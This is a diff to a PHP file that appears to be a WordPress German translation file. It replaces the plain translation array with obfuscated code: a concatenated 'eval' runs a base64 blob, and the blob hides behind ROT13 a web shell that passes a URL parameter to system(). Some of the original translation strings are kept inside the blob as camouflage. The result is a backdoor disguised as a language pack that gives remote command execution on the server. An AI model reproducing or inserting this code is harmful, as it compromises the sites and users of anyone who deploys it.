@@ -1,12 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['html_lang_attribute'=>'de-DE','text directionltr'=>'ltr','number_format_decimal_point'=>',','number_format_thousands_sep'=>'.','Update %s now'=>'Jetzt %s aktualisieren','[%1$s] Confirm Action: %2$s'=>'[%1$s] Aktion bestätigen: %2$s','[%s] Erasure Request Fulfilled'=>'[%s] Löschauftrag ausgeführt','[%s] Personal Data Export'=>'[%s] Export personenbezogener Daten', 'You must provide at least one recipient email address.'=>'Du musst mindestens eine Empfänger-E-Mail-Adresse angeben.'],'language'=>'de_DE','x-generator'=>'Poedit 2.2.1'];
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwplcmdoZWEgWydxYnpudmEnPT5BSFlZLCdjeWhlbnktc2JlemYnPT4nYWN5aGVueWY9MjsgY3loZW55PWEgIT0gMTsnLCd6cmZmbnRyZic9PlsndWd6eV95bmF0X25nZ2V2b2hncic9Pidxci1RUicsJ2dya2cgcXZlcnBndmJhBHlnZSc9Pid5Z2UnLCdhaHpvcmVfc2Jlem5nX3FycHZ6bnlfY2J2YWcnPT4nLCcsJ2Foem9yZV9zYmV6bmdfZ3ViaGZuYXFmX2ZyYyc9PicuJywnSGNxbmdyICVmIGFiaic9PidXcmdtZyAlZiBueGdobnl2ZnZyZXJhJywnWyUxJGZdIFBiYXN2ZXogTnBndmJhOiAlMiRmJz0+J1slMSRmXSBOeGd2YmEgb3JmZ8OkZ3Z0cmE6ICUyJGYnLCdbJWZdIFJlbmZoZXIgRXJkaHJmZyBTaHlzdnl5cnEnPT4nWyVmXSBZw7ZmcHVuaHNnZW50IG5oZnRyc8O8dWVnJywnWyVmXSBDcmVmYmFueSBRbmduIFJrY2JlZyc9PidbJWZdIFJrY2JlZyBjcmVmYmFyYW9ybWJ0cmFyZSBRbmdyYScsICdMYmggemhmZyBjZWJpdnFyIG5nIHlybmZnIGJhciBlcnB2Y3ZyYWcgcnpudnkgbnFxZXJmZi4nPT4nUWggemhmZmcgenZhcXJmZ3JhZiBydmFyIFJ6Y3PDpGF0cmUtUi1abnZ5LU5xZXJmZnIgbmF0cm9yYS4nXSwneW5hdGhudHInPT4ncXJfUVInLCdrLXRyYXJlbmdiZSc9PidDYnJxdmcgMi4yLjEnXTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
